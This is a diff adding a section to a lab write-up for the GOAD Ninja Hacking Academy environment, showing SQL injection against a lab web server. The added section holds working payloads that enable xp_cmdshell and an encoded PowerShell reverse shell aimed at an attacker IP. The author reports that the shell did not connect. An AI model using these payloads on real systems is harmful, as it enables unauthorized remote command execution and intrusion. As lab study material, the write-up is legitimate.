@@ -1,4 +1,4 @@
-layout: default
+<img width="1925" height="945" alt="image" src="https://github.com/user-attachments/assets/45e65ace-a0ac-4d0a-a782-0bcb1b27271b" />layout: default
 title : nighthawk - GOAD - NHA Ninja Hacking Academy (NHA)
 ---
 
@@ -115,6 +115,47 @@ using payload `WAITFOR DELAY '00:00:10'--+-` on url `http://192.168.56.21/Studen
 
 We got the web app to delay loading for 15 secs. Now the juicy part, Poping Shell. 
 <br></br>
+
+
+#### Getting reverse shell into 192.168.56.21
+
+> Injection payload to exec RCE
+
+```sql
+;EXEC%20sp_configure%20'show%20advanced%20options',%201;%20RECONFIGURE;--
+;EXEC%20sp_configure%20'xp_cmdshell',%201;%20RECONFIGURE;--
+;EXEC%20xp_cmdshell%20'ping%20192.168.56.1';--
+```
+send all the payloads 1 by 1 fire up tcpdump listener on your attacker ip 
+
+<img width="951" height="264" alt="image" src="https://github.com/user-attachments/assets/ee943332-3d00-4810-b508-8adc5fb83d17" />
+
+this confirmed we can execute commands and also interact with our attacker machine. now the juicy shelling part. 
+
+- Fire up Ncat listener
+
+<img width="550" height="164" alt="image" src="https://github.com/user-attachments/assets/690e1513-5f4a-405c-a502-2c3964169307" />
+
+> Reverse shell payload 
+
+```
+;EXEC%20xp_cmdshell%20'powershell%20-e%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADUANgAuADEAIgAsADQANAAzACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA%3D%3D';--
+```
+
+- send the payload 
+
+<img width="1908" height="927" alt="image" src="https://github.com/user-attachments/assets/58381ce8-5a48-49bc-a6f0-eec667c9132d" />
+
+- check listener
+
+<img width="640" height="180" alt="image" src="https://github.com/user-attachments/assets/2548d04a-34b0-44f6-b947-44eeb08b0460" />
+
+Our listener didn't catch shell. maybe there's a defense. 
+
+
+
+
+
 
 
 
